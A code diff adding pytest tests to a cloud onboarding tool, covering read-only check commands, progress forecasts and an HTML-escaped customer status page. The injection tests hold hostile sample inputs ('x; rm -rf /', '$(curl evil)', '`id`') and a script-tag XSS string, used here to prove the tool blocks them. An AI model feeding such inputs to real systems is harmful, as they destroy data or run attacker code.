@@ -1,4 +1,5 @@
 import json
+import re
 import shutil
 from datetime import timedelta
 from pathlib import Path
@@ -201,3 +202,75 @@ def test_the_cli_explains_an_error_and_returns_3_when_it_cannot(capsys):
     assert main(["triage", "nothing we know"]) == 3
     assert main(["onboarding", str(NW)]) == 0 and "Unblock in this order" in capsys.readouterr().out
     assert main(["preflight", "--providers", "gcp", "--kubernetes"]) == 0 and "Google Cloud" in capsys.readouterr().out
+
+
+# ----------------------------------------------------------------------------- 0.17: checks, progress, customer page
+
+HIST = ROOT / "examples" / "history" / "northwind-2026-09"
+WRITE_WORDS = re.compile(r"\b(create|delete|remove|update|put|set|apply|patch|attach|detach|enable|disable|add|assign|rotate|reset|grant|revoke|deploy|edit|replace|scale|drain|cordon|exec|cp|run|start|stop|tag|modify|register)\b", re.I)
+
+
+def test_every_check_command_only_reads():
+    allowed = {"aws", "az", "gcloud", "kubectl"}
+    for it in o.catalogue()["issues"]:
+        assert it["checks"], it["id"]
+        for cmd in it["checks"]:
+            words = cmd.split()
+            assert words[0] in allowed, cmd
+            verbs = " ".join(w for w in words[1:] if not w.startswith("-") and "{" not in w and "=" not in w and "\"" not in w)
+            assert not WRITE_WORDS.search(verbs), f"{it['id']}: {cmd}"
+            if words[:2] == ["az", "rest"]:
+                assert "--method get" in cmd, cmd
+            assert not re.search(r"[;&|`$<>]", cmd.split("--query")[0].split("--format")[0]), f"no shell syntax outside quoted queries: {cmd}"
+
+
+def test_known_values_fill_the_commands_and_nothing_can_inject_shell():
+    assert o.checks_for("aws_scp_deny", {"account": "123456789012"})[0].endswith("--target-id 123456789012 --filter SERVICE_CONTROL_POLICY")
+    for evil in ("x; rm -rf /", "$(curl evil)", "a b", "`id`", "x|y", "x\ny"):
+        out = " ".join(o.checks_for("aws_scp_deny", {"account": evil}))
+        assert evil not in out and "<account>" in out
+    assert o.checks_for("no_such_issue") == []
+
+
+def test_progress_since_the_earlier_snapshot_and_a_forecast():
+    new, old = data(NW), data(HIST)
+    d = o.delta(o.diagnose(old), o.diagnose(new), old.as_of, new.as_of)
+    assert d["complete_now"] > d["complete_before"] and d["finished"] and d["per_week"] > 0
+    assert d["forecast"]["state"] == "on_track" and d["forecast"]["date"] > new.as_of.isoformat()
+    assert d["newly_broken"] == ["azure-001"] and any(b["id"] == "azure-001" for b in d["back"])
+    assert any(x["issue"] == "not_deployed" for x in d["fixed"])
+    assert set(d["arrived"]) and all(a not in {r["id"] for r in o.diagnose(old)["accounts"]} for a in d["arrived"])
+
+
+def test_no_progress_is_called_stalled_and_nothing_left_is_called_done():
+    d = o.diagnose(data(NW))
+    assert o.delta(d, d, data(HIST).as_of, data(NW).as_of)["forecast"]["state"] == "stalled"
+    done = dict(d, funnel=[{"stage": s, "label": s, "reached": 5} for s in o.STAGES])
+    assert o.delta(done, done, data(HIST).as_of, data(NW).as_of)["forecast"]["state"] == "done"
+
+
+def test_the_customer_page_is_for_the_customer(nw):
+    toml = (nw / "customer.toml").read_text()
+    (nw / "customer.toml").write_text(re.sub(r'name = "[^"]*"', 'name = "<script>alert(1)</script> & Co"', toml, count=1))
+    d = data(nw)
+    page = o.customer_status(o.diagnose(d), d.name, d.as_of.isoformat(), "accounts")
+    html, md = page["html"], page["markdown"]
+    assert "<script>" not in html and "&lt;script&gt;" in html and "default-src 'none'" in html
+    for internal in ("Yield", "L1", "priority", "points", "trust gate", "expansion"):
+        assert internal not in md and internal not in html, internal
+    assert "Waiting on your teams" in md and "To check (read-only)" in md and "One change fixes all of them" in md
+    assert "identity team" in md and "azure-001" in md                     # the connector that stopped is named
+
+
+def test_analyze_gives_the_page_and_the_progress_when_compared():
+    r = analyze(str(NW), since=str(HIST))
+    assert r["dashboard"]["onboarding"]["delta"]["forecast"]["state"] == "on_track"
+    assert r["onboarding_status_html"].startswith("<!doctype html>") and "Since 2026-09-30" in r["onboarding_status_markdown"]
+    assert "delta" not in analyze(str(NW))["dashboard"]["onboarding"]
+
+
+def test_the_cli_writes_the_customer_page(tmp_path, capsys):
+    from beyond90.cli import main
+    out = tmp_path / "status.html"
+    assert main(["onboarding", str(NW), "--since", str(HIST), "--customer-page", "--format", "html", "--out", str(out)]) == 0
+    assert out.read_text().startswith("<!doctype html>") and "complete around" in out.read_text()
